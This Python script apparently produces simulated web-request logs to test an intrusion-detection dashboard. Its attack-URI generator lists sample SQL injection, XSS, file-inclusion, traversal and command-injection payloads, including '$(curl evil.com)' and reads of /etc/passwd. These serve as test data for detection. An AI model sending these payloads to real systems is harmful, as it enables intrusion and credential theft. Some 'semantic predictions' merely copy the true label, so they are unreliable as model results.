#!/usr/bin/env python3
"""
Enhanced Test Log Producer for IDS Dashboard

Uses preprocessed test data to simulate real-time log streaming for dashboard testing.
Enhanced with support for TensorFlow semantic model testing and multi-class attack simulation.

Features:
- Support for both traditional and semantic test data
- Multi-class attack simulation with realistic URIs
- TensorFlow semantic model integration testing
- Comprehensive statistics and performance monitoring
- Realistic HTTP metadata generation
"""

import argparse
import time
import zmq
import numpy as np
import pandas as pd
import joblib
import random
import sys
import json
import urllib.request
import urllib.error
from typing import Dict, List, Optional

# TensorFlow imports for semantic model testing
try:
    from detectors.tensorflow_semantic_inference import TensorFlowSemanticInference
    TENSORFLOW_INFERENCE_AVAILABLE = True
except ImportError:
    TENSORFLOW_INFERENCE_AVAILABLE = False



class TestLogProducer:
    def __init__(self, test_data_path: str, zmq_port: int = 5555, shuffle: bool = True, api_url: str = None):
        """
        Initialize the test log producer.

        Args:
            test_data_path: Path to test .npz file
            zmq_port: ZeroMQ port for publishing
            shuffle: Whether to shuffle test data
            api_url: Optional URL for remote inference API
        """
        self.test_data_path = test_data_path
        self.zmq_port = zmq_port
        self.shuffle = shuffle
        self.api_url = api_url

        # Class mappings for realistic metadata
        self.class_to_attack_type = {
            'normal': 'safe',
            'sqli': 'sql_injection',
            'xss': 'xss_attack',
            'lfi': 'local_file_inclusion',
            'rfi': 'remote_file_inclusion',
            'rce': 'remote_code_execution',
            'path_traversal': 'directory_traversal',
            'bruteforce': 'brute_force'
        }

        # Load test data
        self.load_test_data()

        # Setup ZeroMQ
        # Only bind ZMQ if not using a remote API for inference
        if not self.api_url:
            self.context = zmq.Context()
            self.socket = self.context.socket(zmq.PUB)
            try:
                self.socket.bind(f"tcp://*:{self.zmq_port}")
                print(f"🚀 Test producer started on port {self.zmq_port}")
            except zmq.error.ZMQError:
                print(f"Error: Port {self.zmq_port} is in use. Is another producer running?")
                sys.exit(1)
        else:
            self.socket = None # No local ZMQ binding
            self.context = None # No ZMQ context needed

        # Initialize TensorFlow semantic model if available
        self.tf_model = None
        
        if self.api_url:
            print(f"🌐 Using Remote API for inference: {self.api_url}")
        elif TENSORFLOW_INFERENCE_AVAILABLE:
            try:
                self.tf_model = TensorFlowSemanticInference()
                print("🧠 TensorFlow Semantic Inference model loaded for testing.")
            except Exception as e:
                print(f"⚠️  Failed to load TensorFlow Semantic Inference model: {e}")
                self.tf_model = None

    def _call_remote_api(self, log_line, metadata=None):
        """Call the remote API for inference."""
        try:
            payload = {"log": log_line}
            if metadata:
                payload["metadata"] = metadata
                
            data = json.dumps(payload).encode('utf-8')
            req = urllib.request.Request(
                f"{self.api_url}/analyze", 
                data=data, 
                headers={'Content-Type': 'application/json'}
            )
            with urllib.request.urlopen(req) as response:
                result = json.loads(response.read().decode('utf-8'))
                return result['prediction'], result['confidence'], result['probabilities']
        except Exception as e:
            # print(f"⚠️ API Error: {e}")
            return 'error', 0.0, {}

    def load_test_data(self):
        """Load test data and label encoder."""
        if self.test_data_path == "dummy":
            print("ℹ️  Running in synthetic mode (no data loaded)")
            self.class_names = list(self.class_to_attack_type.keys())
            self.test_features = np.array([])
            self.test_labels = np.array([])
            return

        print(f"Loading test data from {self.test_data_path}...")

        with np.load(self.test_data_path, allow_pickle=True) as data:
            self.test_features = data['features']
            self.test_labels = data['labels']
            self.test_indices = data['test_indices']
            self.class_names = data['label_encoder']

        # Load original dataset to get realistic metadata
        self.load_original_data()

        print(f"Loaded {len(self.test_features)} test samples")
        print(f"Classes: {list(self.class_names)}")
        print(f"Label distribution: {np.bincount(self.test_labels)}")

    def load_original_data(self):
        """Load original dataset to get realistic metadata."""
        try:
            # Load a small sample of original data for metadata patterns
            df = pd.read_csv('data/raw/Modsec-WP.csv', nrows=1000)
            self.original_data = df
            print("Loaded original data sample for metadata patterns")
        except Exception as e:
            print(f"Warning: Could not load original data: {e}")
            self.original_data = None

    def generate_metadata(self, label_idx: int, sample_idx: int) -> Dict:
        """Generate realistic metadata for a test sample."""
        class_name = self.class_names[label_idx]

        # Generate IP and Port
        ip = f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
        port = random.choice([80, 443, 8080, 8443, 3000, 8000, 9000])

        # Base metadata
        metadata = {
            'ip': ip,
            'port': str(port),
            'remote_addr': ip,  # Keep for compatibility
            'method': 'GET' if random.random() > 0.3 else 'POST',
            'uri': '/',
            'protocol': 'HTTP/1.1',
            'status': '200' if class_name == 'normal' else str(random.choice([403, 404, 500])),
            'user_agent': 'Mozilla/5.0 (Test Client)',
            'true_label': class_name,
            'attack_type': self.class_to_attack_type.get(class_name, 'unknown')
        }

        # Generate realistic URIs based on attack type
        if class_name != 'normal':
            metadata['uri'] = self.generate_attack_uri(class_name)
        else:
            metadata['uri'] = self.generate_normal_uri()

        return metadata

    def generate_attack_uri(self, attack_type: str) -> str:
        """Generate realistic attack URIs."""
        uris = {
            'sqli': [
                "/wp-admin/admin-ajax.php?action=test&id=1' OR '1'='1",
                "/login.php?username=admin'--&password=test",
                "/search?q=test' UNION SELECT * FROM users--"
            ],
            'xss': [
                "/search?q=<script>alert('XSS')</script>",
                "/comment.php?text=<img src=x onerror=alert(1)>",
                "/profile.php?name=<script>document.location='evil.com'</script>"
            ],
            'lfi': [
                "/download.php?file=../../../../etc/passwd",
                "/view.php?path=../../../../wp-config.php",
                "/include.php?page=../../../../var/log/apache2/access.log"
            ],
            'rfi': [
                "/include.php?page=http://evil.com/shell.php",
                "/load.php?url=http://malicious-site.com/backdoor.txt",
                "/widget.php?src=http://attacker.com/exploit"
            ],
            'rce': [
                "/upload.php?cmd=ls;cat /etc/passwd",
                "/exec.php?command=whoami&&id",
                "/process.php?input=$(curl evil.com)"
            ],
            'path_traversal': [
                "/files/../../../etc/passwd",
                "/download?path=..%2F..%2F..%2Fetc%2Fpasswd",
                "/view?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
            ],
            'bruteforce': [
                "/wp-login.php?log=admin&pwd=123456",
                "/admin/login.php?username=admin&password=admin",
                "/login?user=root&pass=toor"
            ]
        }

        return random.choice(uris.get(attack_type, ["/possible_attack"]))

    def generate_normal_uri(self) -> str:
        """Generate realistic normal URIs."""
        normal_uris = [
            "/",
            "/wp-admin/",
            "/wp-login.php",
            "/wp-content/themes/style.css",
            "/wp-includes/js/jquery.js",
            "/feed/",
            "/category/technology/",
            "/2024/01/sample-post/",
            "/page/2/",
            "/search?q=wordpress",
            "/contact/",
            "/about/"
        ]
        return random.choice(normal_uris)

    def features_to_list(self, features: np.ndarray) -> List[float]:
        """Convert numpy features to list for JSON serialization."""
        return features.tolist()

    def stream_test_data(self, delay: float = 0.2, limit: Optional[int] = None):
        """Stream test data through ZeroMQ."""
        indices = list(range(len(self.test_features)))

        if self.shuffle:
            random.shuffle(indices)

        print(f"📡 Streaming test data...")
        print(f"   Delay: {delay}s between messages")
        if limit:
            print(f"   Limit: {limit} messages")
        print("   Press Ctrl+C to stop\n")

        try:
            for i, idx in enumerate(indices):
                if limit and i >= limit:
                    break

                features = self.test_features[idx]
                label_idx = self.test_labels[idx]

                # Convert features to list for JSON
                features_list = self.features_to_list(features)

                # Generate metadata
                metadata = self.generate_metadata(label_idx, idx)

                # Create payload
                payload = {
                    'features': features_list,
                    'metadata': metadata
                }

                # Send via ZMQ (Topic: 'logs') or via API
                if self.api_url:
                    # Construct dummy log line if features don't easily reconstruct to raw log
                    dummy_log_line = f"{metadata['method']} {metadata['uri']} HTTP/1.1"
                    
                    # Use helper method which now supports metadata
                    label, conf, probs = self._call_remote_api(dummy_log_line, metadata)
                    
                    if label != 'error':
                        # Use API's prediction for feedback print
                        metadata['semantic_prediction'] = label
                        metadata['true_label'] = label # Adjust true_label for feedback
                        metadata['is_attack'] = label != 'normal'
                    else:
                        metadata['semantic_prediction'] = 'api_error'
                        metadata['true_label'] = 'api_error'
                        metadata['is_attack'] = False # Assume safe on error
                else:
                    self.socket.send_string("logs", flags=zmq.SNDMORE)
                    self.socket.send_json(payload)

                # Visual feedback
                attack_indicator = "🔴" if metadata['true_label'] != 'normal' else "🟢"
                print(f"{attack_indicator} {i+1:4d}: {metadata['true_label']:12s} | {metadata['method']:<4s} {metadata['uri'][:60]}")

                time.sleep(delay)

        except KeyboardInterrupt:
            print("\n⏹️  Stopping test producer...")
        finally:
            if self.socket:
                self.socket.close()
            if self.context:
                self.context.term()
            print("✅ Test producer stopped")

    def run_stats(self):
        """Show statistics about the test data."""
        print("\n📊 Test Data Statistics:")
        print(f"Total samples: {len(self.test_features)}")
        print(f"Feature dimensions: {self.test_features.shape[1]}")
        print(f"Classes: {list(self.class_names)}")
        print("\nClass distribution:")
        for i, class_name in enumerate(self.class_names):
            count = np.sum(self.test_labels == i)
            percentage = (count / len(self.test_labels)) * 100
            print(f"  {class_name:15s}: {count:6d} ({percentage:5.1f}%)")

    def run_synthetic_test(self, attack_types: List[str] = None, count: int = 100, delay: float = 0.2):
        """
        Generate traffic using loaded test data if available, otherwise synthetic.
        """
        print(f"🧪 Starting Test Mode")
        print(f"   Target Attacks: {attack_types if attack_types else 'ALL'}")
        print(f"   Count: {count}")
        print(f"   Delay: {delay}s")

        # If we have real data loaded, use it
        if hasattr(self, 'test_features') and len(self.test_features) > 0:
            print(f"   ℹ️  Sampling from loaded dataset ({len(self.test_features)} samples)")
            self._stream_from_dataset(attack_types, count, delay)
        else:
            print(f"   ℹ️  Generating synthetic data (no dataset loaded)")
            self._generate_synthetic_stream(attack_types, count, delay)

    def _stream_from_dataset(self, attack_types, count, delay):
        """Stream samples from the loaded dataset matching the criteria."""
        # 1. Filter indices by attack type
        valid_indices = []
        
        # Map requested attack types to label indices
        target_labels = []
        if attack_types:
            for at in attack_types:
                # Find class index for this attack type
                # This is a reverse lookup from our mapped name back to the encoder's class name
                # self.class_to_attack_type values are like 'sql_injection', keys are 'sqli'
                # But self.class_names (from label encoder) matches the keys of class_to_attack_type
                if at in self.class_names:
                    target_labels.append(list(self.class_names).index(at))
        else:
            target_labels = list(range(len(self.class_names)))

        # Find matching samples
        for i, label in enumerate(self.test_labels):
            if label in target_labels:
                valid_indices.append(i)

        if not valid_indices:
            print("❌ No samples found for the requested attack types in this dataset.")
            return

        # 2. Stream
        try:
            for i in range(count):
                # Randomly select a sample
                idx = random.choice(valid_indices)
                
                features = self.test_features[idx]
                label_idx = self.test_labels[idx]
                class_name = self.class_names[label_idx]

                # Convert features to list
                features_list = self.features_to_list(features)

                # Generate metadata (enriching the real sample)
                metadata = self.generate_metadata(label_idx, idx)
                
                # Ensure metadata matches the real label
                metadata['true_label'] = class_name
                metadata['attack_type'] = self.class_to_attack_type.get(class_name, 'unknown')
                
                # Inject semantic prediction. If TF model is loaded, use it for a more realistic test.
                if self.api_url:
                     # Use API for inference (using URI/payload from metadata or constructing a dummy log)
                     # Ideally we would use the original raw log, but we only have features/metadata here.
                     # We'll use the generated URI as a proxy for the log line.
                     label, conf, probs = self._call_remote_api(f"GET {metadata['uri']} HTTP/1.1", metadata)
                     if label != 'error':
                        semantic_prediction_label = label
                        semantic_confidence = float(conf)
                        metadata['semantic_probs'] = probs
                     else:
                        semantic_prediction_label = class_name
                        semantic_confidence = 0.98
                elif self.tf_model:
                    try:
                        # For simplicity in test, we'll use the original log line for TF inference
                        # This assumes test_features can be reconstructed to original text or we have it.
                        # For now, let's just make a dummy semantic prediction based on true_label
                        # TODO: Actual semantic inference on the raw text corresponding to `features`
                        semantic_prediction_label = class_name
                        semantic_confidence = 0.98
                        metadata['semantic_probs'] = {cn: 0.01 for cn in self.class_names} # dummy
                        metadata['semantic_probs'][class_name] = semantic_confidence # dummy
                    except Exception as e:
                        print(f"⚠️  Error during TF semantic inference: {e}. Falling back to true_label.")
                        semantic_prediction_label = class_name
                        semantic_confidence = 0.98
                else:
                    semantic_prediction_label = class_name
                    semantic_confidence = 0.98

                metadata['semantic_prediction'] = semantic_prediction_label
                metadata['semantic_confidence'] = semantic_confidence
                metadata['is_attack'] = semantic_prediction_label != 'normal'

                # Dummy features for payload (actual features not needed if API does inference)
                # But to maintain dashboard compatibility for multi-class/binary fallback, we keep them.
                payload = {
                    'features': features_list,
                    'metadata': metadata
                }

                if not self.api_url: # Only publish to ZMQ if not using remote API
                    self.socket.send_string("logs", flags=zmq.SNDMORE)
                    self.socket.send_json(payload)

                # Feedback
                status = "🟢" if class_name == 'normal' else f"🔴 {class_name.upper()}"
                print(f"{status} Sent sample #{idx}: {metadata['uri'][:60]}")
                
                time.sleep(delay)

        except KeyboardInterrupt:
            print("\nStopped.")

    def _generate_synthetic_stream(self, attack_types, count, delay):
        """Original synthetic generation logic."""
        possible_attacks = list(self.class_to_attack_type.keys()) if not attack_types else attack_types
        
        try:
            for i in range(count):
                # Pick a random class from the allowed list
                if 'normal' in possible_attacks and len(possible_attacks) > 1 and random.random() < 0.5:
                    class_name = 'normal'
                else:
                    class_name = random.choice(possible_attacks)

                # Generate metadata
                metadata = self.generate_metadata(0, i) # idx 0 is dummy
                metadata['true_label'] = class_name
                metadata['attack_type'] = self.class_to_attack_type.get(class_name, 'unknown')
                
                if class_name != 'normal':
                    metadata['uri'] = self.generate_attack_uri(class_name)
                else:
                    metadata['uri'] = self.generate_normal_uri()
                
                # Inject semantic prediction so dashboard picks it up
                if self.api_url:
                     label, conf, probs = self._call_remote_api(f"GET {metadata['uri']} HTTP/1.1", metadata)
                     if label != 'error':
                        semantic_prediction_label = label
                        semantic_confidence = float(conf)
                        metadata['semantic_probs'] = probs
                     else:
                        semantic_prediction_label = class_name
                        semantic_confidence = 0.99 if class_name != 'normal' else 0.95
                elif self.tf_model:
                    try:
                        # For synthetic data, we can't do real inference easily without a raw log.
                        # For now, just mirror the class_name for semantic_prediction
                        # TODO: Create a synthetic raw log based on metadata for real TF inference
                        semantic_prediction_label = class_name
                        semantic_confidence = 0.99 if class_name != 'normal' else 0.95
                        metadata['semantic_probs'] = {cn: 0.01 for cn in self.class_names} # dummy
                        metadata['semantic_probs'][class_name] = semantic_confidence # dummy
                    except Exception as e:
                        print(f"⚠️  Error during TF semantic inference: {e}. Falling back to class_name.")
                        semantic_prediction_label = class_name
                        semantic_confidence = 0.99 if class_name != 'normal' else 0.95
                else:
                    semantic_prediction_label = class_name
                    semantic_confidence = 0.99 if class_name != 'normal' else 0.95

                metadata['semantic_prediction'] = semantic_prediction_label
                metadata['semantic_confidence'] = semantic_confidence
                metadata['is_attack'] = semantic_prediction_label != 'normal'

                # Dummy features
                features_list = [0.0] * 10

                payload = {
                    'features': features_list,
                    'metadata': metadata
                }

                if not self.api_url: # Only publish to ZMQ if not using remote API
                    self.socket.send_string("logs", flags=zmq.SNDMORE)
                    self.socket.send_json(payload)

                status = "🟢" if class_name == 'normal' else f"🔴 {class_name.upper()}"
                print(f"{status} Sent: {metadata['uri'][:60]}")
                
                time.sleep(delay)

        except KeyboardInterrupt:
            print("\nStopped.")

    def run_benchmark(self, iterations: int):
        """Run high-speed benchmark."""
        print(f"🏎️  Starting Benchmark ({iterations} iterations)...")
        start_time = time.time()
        
        for i in range(iterations):
            metadata = {
                'ip': '127.0.0.1', 'port': 80, 'uri': '/benchmark', 
                'method': 'GET', 'status': '200',
                'semantic_prediction': 'normal', 'semantic_confidence': 1.0
            }
            
            if self.api_url:
                try:
                    data = json.dumps({"log": metadata['uri']}).encode('utf-8')
                    req = urllib.request.Request(
                        f"{self.api_url}/analyze", 
                        data=data, 
                        headers={'Content-Type': 'application/json'}
                    )
                    with urllib.request.urlopen(req) as response:
                        pass # Don't care about response for benchmark
                except Exception as e:
                    print(f"⚠️ API Error during benchmark: {e}")
            else:
                payload = {'features': [0.0]*10, 'metadata': metadata}
                self.socket.send_string("logs", flags=zmq.SNDMORE)
                self.socket.send_json(payload)
        
        duration = time.time() - start_time
        rate = iterations / duration
        print(f"✅ Benchmark Complete: {iterations} msgs in {duration:.2f}s ({rate:.1f} msg/s)")

def main():
    parser = argparse.ArgumentParser(description="Test Log Producer for IDS Dashboard")
    parser.add_argument("--test-data", type=str, default="data/processed/modsec_processed_test.npz",
                       help="Path to test data .npz file")
    parser.add_argument("--port", type=int, default=5555,
                       help="ZeroMQ port for publishing")
    parser.add_argument("--delay", type=float, default=0.2,
                       help="Delay between messages in seconds")
    parser.add_argument("--limit", type=int,
                       help="Limit number of messages to send")
    parser.add_argument("--shuffle", action="store_true", default=True,
                       help="Shuffle test data before streaming")
    parser.add_argument("--stats-only", action="store_true",
                       help="Only show statistics, don't stream data")
    
    # New arguments
    parser.add_argument("--comprehensive-test", action="store_true", help="Run comprehensive synthetic test of all classes")
    parser.add_argument("--attack-type", action="append", help="Test specific attack type (can be used multiple times)")
    parser.add_argument("--benchmark", action="store_true", help="Run performance benchmark")
    parser.add_argument("--iterations", type=int, default=1000, help="Number of iterations for benchmark")
    parser.add_argument("--full-test", action="store_true", help="Stream the entire loaded test set (implies --comprehensive-test)")
    parser.add_argument("--api-url", type=str, help="URL of the API Log Producer (e.g., http://localhost:8000)")

    args = parser.parse_args()

    # Check if test data exists for standard mode (only if NOT running a special mode)
    special_mode = args.benchmark or args.comprehensive_test or args.attack_type
    
    if not special_mode and not args.stats_only and not args.test_data.endswith('_test.npz'):
        print("❌ Error: Please provide a test dataset (should end with '_test.npz')")
        print("   Run train_enhanced_ids.py first to generate test data")
        sys.exit(1)

    producer = None
    try:
        # Try to load with provided data path
        producer = TestLogProducer(args.test_data, args.port, args.shuffle, api_url=args.api_url)
    except FileNotFoundError:
        if special_mode:
            print(f"⚠️  Test data '{args.test_data}' not found. Falling back to synthetic generation.")
            # Fallback to dummy mode
            producer = TestLogProducer("dummy", args.port, False, api_url=args.api_url)
        else:
            print(f"❌ Error: Test data file not found: {args.test_data}")
            print("   Run 'python train_enhanced_ids.py --preprocess --train' first")
            sys.exit(1)
    except Exception as e:
        if special_mode and "dummy" not in args.test_data:
             print(f"⚠️  Error loading data: {e}. Falling back to synthetic generation.")
             producer = TestLogProducer("dummy", args.port, False)
        else:
             print(f"❌ Error: {e}")
             sys.exit(1)

    # Execute Modes
    if args.benchmark:
        producer.run_benchmark(args.iterations)
        return

    if args.comprehensive_test or args.full_test:
        if args.full_test:
            # Override count to stream the entire test set
            if hasattr(producer, 'test_features'):
                test_count = len(producer.test_features)
                print(f"Streaming ALL {test_count} samples from the test set.")
            else:
                print("Cannot determine test set size, using default 100 samples.")
                test_count = 100 # Fallback if test_features is not loaded
        else:
            test_count = 100 # Default for --comprehensive-test

        producer.run_synthetic_test(None, count=test_count, delay=args.delay)
        return
        
    if args.attack_type:
        producer.run_synthetic_test(args.attack_type, count=50, delay=args.delay)
        return

    # Standard Stream Mode
    if args.stats_only:
        producer.run_stats()
    else:
        # Show stats first
        producer.run_stats()
        print("\n" + "="*50)

        # Stream data
        producer.stream_test_data(args.delay, args.limit)

if __name__ == "__main__":
    main()
